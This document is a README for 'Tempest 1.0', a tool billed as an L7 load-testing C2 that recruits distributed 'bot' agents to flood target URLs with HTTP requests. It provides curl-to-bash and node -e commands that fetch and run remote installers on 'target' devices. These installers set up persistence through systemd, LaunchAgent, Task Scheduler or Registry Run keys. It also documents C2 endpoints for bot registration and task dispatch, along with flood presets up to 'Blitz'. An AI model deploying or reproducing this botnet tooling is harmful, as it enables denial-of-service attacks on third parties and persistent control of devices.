# Tempest 1.0

Self-contained L7 load-testing C2 with a web UI, distributed bot agents, live Prometheus metrics, and one-command installs for both the server and client devices.

---

## Table of Contents

- [Server Setup (Ubuntu)](#server-setup-ubuntu)
- [Agent / Client Install](#agent--client-install)
- [Usage](#usage)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [API Reference](#api-reference)
- [Attack Vectors](#attack-vectors)
- [Features](#features)

---

## Server Setup (Ubuntu)

> One command installs Python 3, starts Tempest on port 5000, and sets it up to auto-start on reboot via systemd.

**Requirements:** Ubuntu 20.04+ (or any Debian-based system with `apt`)

```bash
bash <(curl -fsSL https://raw.githubusercontent.com/moj-alabi/test/main/Tempest/install_server.sh)
```

Or if you already have the repo cloned:

```bash
git clone https://github.com/moj-alabi/test.git
cd test/Tempest
bash install_server.sh
```

### What it does

1. Installs `python3` and `git` if missing
2. Clones / updates the repo
3. Writes a `systemd` service (`tempest.service`) so Tempest starts on boot
4. Opens port `5000` via `ufw` if the firewall is active
5. Prints the URL to access the dashboard

**After install, open:**

```
http://<YOUR_SERVER_IP>:5000
```

### Manual start (no systemd)

```bash
cd Tempest
python3 server.py
```

Override proxy / port with env vars:

```bash
L7_PROXY_HOST=10.0.10.118 L7_PROXY_PORT=3128 PORT=5000 python3 server.py
```

---

## Agent / Client Install

> One command — paste on any device (Linux, macOS, or Windows). Requires only Node.js. Auto-detects OS, installs Python if missing, deploys the agent, and sets up persistence.

### Step 1 — Enter your C2 IP in the Tempest dashboard

Go to **Devices → Onboard Device**, type your server's IP, and copy the generated command.

### Step 2 — Paste on the target device

**Linux / macOS:**

```bash
node -e "$(curl -s 'http://<C2_IP>:5000/install.js?host=<C2_IP>&port=5000')"
```

**Windows (PowerShell):**

```powershell
node -e (iwr 'http://<C2_IP>:5000/install.js?host=<C2_IP>&port=5000').Content
```

> Replace `<C2_IP>` with your Tempest server's IP address.

### What the installer does

| Step | Action |
|------|--------|
| 1 | Detects OS (`linux` / `darwin` / `win32`) |
| 2 | Finds Python 3 — or installs it (`apt` / `brew` / `winget`) |
| 3 | Downloads `agent.py` from C2 with your IP baked in |
| 4 | Starts the agent immediately in the background |
| 5 | Sets up **persistence** (survives reboots): |
| | • Linux → `systemd` service, falls back to cron |
| | • macOS → `LaunchAgent` plist, falls back to cron |
| | • Windows → Task Scheduler, falls back to Registry Run key |
| 6 | Checks if **Prometheus** is installed → auto-adds scrape job |
| 7 | Exposes metrics at `http://0.0.0.0:9100/metrics` |

Agent installs to `~/.l7agent/agent.py` and logs to `~/.l7agent/agent.log`.

---

## Usage

### 1 — Open the Dashboard

```
http://<YOUR_SERVER_IP>:5000
```

### 2 — Configure the flood

| Field | Description |
|-------|-------------|
| Target URL | Full URL including protocol (`https://example.com`) |
| Attack Vector | HTTP method — GET, POST, HEAD, PUT, PATCH, DELETE, OPTIONS, or MULTI |
| Connections | Parallel threads (workers) |
| Target RPS | Max requests per second |
| Duration (s) | How long to run |
| Presets | Light / Medium / Heavy / Blitz quick-fills |

### 3 — Choose launch mode

| Mode | Traffic source |
|------|---------------|
| **This server (via proxy)** | Sends traffic through configured Squid proxy |
| **Selected agents** | Dispatches flood task to chosen connected bots |

Both modes can run simultaneously.

### 4 — Monitor live

- Real-time RPS chart
- p50 / p99 latency
- HTTP status breakdown (2xx / 3xx / 4xx / 5xx)
- Per-agent live metrics table (Devices page, refreshes every 5s)

---

## Architecture

```
Tempest/
├── server.py              # C2 HTTP server — UI + REST/SSE API (pure stdlib)
├── engine.py              # Local flood engine (pure stdlib)
├── public/
│   ├── index.html         # Dashboard UI
│   ├── styles.css         # UI styles
│   └── app.js             # Charts, SSE, agent selector, metrics polling
├── agent/
│   ├── agent_template.py  # Bot agent template (pure stdlib)
│   │                        # • Registers with C2
│   │                        # • Polls for tasks every 5s
│   │                        # • Sends live metrics on every ping
│   │                        # • Exposes /metrics (Prometheus, port 9100)
│   ├── install_template.js   # Universal Node.js installer (all platforms)
│   ├── install_template.sh   # Linux/macOS bash installer
│   ├── install_template.ps1  # Windows PowerShell installer
│   └── install_server.sh     # Ubuntu C2 server one-click installer
└── README.md
```

### Metrics flow

```
Agent (bot)
  │
  ├── Every 5s ping → POST /api/agent/ping  { id, metrics: {rps, p50, p99, ...} }
  │                                                  │
  │                                             C2 stores live_metrics per bot
  │                                                  │
  │                                          GET /api/agent/metrics
  │                                                  │
  │                                        Dashboard polls every 5s
  │                                        → Live Agent Metrics table
  │
  └── Port 9100 /metrics  ← Prometheus scrapes directly (optional)
```

---

## Configuration

### Server env vars

| Variable | Default | Description |
|----------|---------|-------------|
| `L7_PROXY_HOST` | `10.0.10.118` | Squid proxy host |
| `L7_PROXY_PORT` | `3128` | Squid proxy port |
| `PORT` | `5000` | Web UI + C2 API port |

### Agent env vars

The agent has no env vars — C2 address is baked in at install time. To change it, re-run the installer with a new IP.

---

## API Reference

### Flood control

| Method | Path | Body / Params | Description |
|--------|------|---------------|-------------|
| `GET` | `/api/proxy-status` | — | TCP reachability check on proxy |
| `GET` | `/api/config` | — | Current proxy config |
| `POST` | `/api/config` | `{host, port}` | Update proxy config at runtime |
| `POST` | `/api/start` | `{target, method, workers, rps, duration, local, bots, agent_ids}` | Start flood |
| `POST` | `/api/stop` | — | Graceful stop (drains in-flight) |
| `GET` | `/api/stream` | — | Server-Sent Events — live tick / log / done events |

### Agent C2 endpoints

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/api/agent/register` | Agent self-registration |
| `POST` | `/api/agent/ping` | Heartbeat + live metrics push |
| `GET` | `/api/agent/task?id=<agent_id>` | Poll for pending flood task |
| `POST` | `/api/agent/result` | Report completed task result |
| `GET` | `/api/agent/metrics` | Aggregated live metrics for all agents |
| `GET` | `/api/bots` | List registered bots |
| `POST` | `/api/bots/remove` | Remove a bot `{id}` |

### Installers

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/install.js?host=X&port=Y` | Universal Node.js installer (baked C2 address) |
| `GET` | `/install.sh?host=X&port=Y` | Bash installer |
| `GET` | `/install.ps1?host=X&port=Y` | PowerShell installer |
| `GET` | `/api/agent/generate?host=X&port=Y` | Download `agent.py` with baked C2 address |

---

## Attack Vectors

| Vector | Description |
|--------|-------------|
| `GET` | Standard HTTP GET flood |
| `POST` | POST flood with JSON body |
| `HEAD` | HEAD flood (no body — lowest bandwidth) |
| `PUT` | PUT flood |
| `PATCH` | PATCH flood |
| `DELETE` | DELETE flood |
| `OPTIONS` | OPTIONS flood |
| `MULTI` | All 7 methods cycled simultaneously |

---

## Features

- **Zero dependencies** — pure Python stdlib on server and agents; Node.js only needed for the one-click installer
- **Live RPS chart** (Chart.js, 120-point rolling window)
- **HTTP status doughnut** (2xx / 3xx / 4xx / 5xx breakdown)
- **Progress bar + elapsed time**
- **Stop button** (graceful, drains in-flight requests)
- **Run history** (localStorage, 50 entries)
- **Distributed agents** — each bot floods directly from its own IP
- **Agent selector** — pick individual bots or all
- **Live agent metrics table** — RPS, totals, p50/p99 per bot (5s refresh)
- **Prometheus metrics** on each agent at `:9100/metrics`
- **Auto Prometheus scrape config** — installer adds job to `prometheus.yml` if found
- **Persistence** on all platforms (systemd / LaunchAgent / Task Scheduler)
- **Quick presets**: Light / Medium / Heavy / Blitz
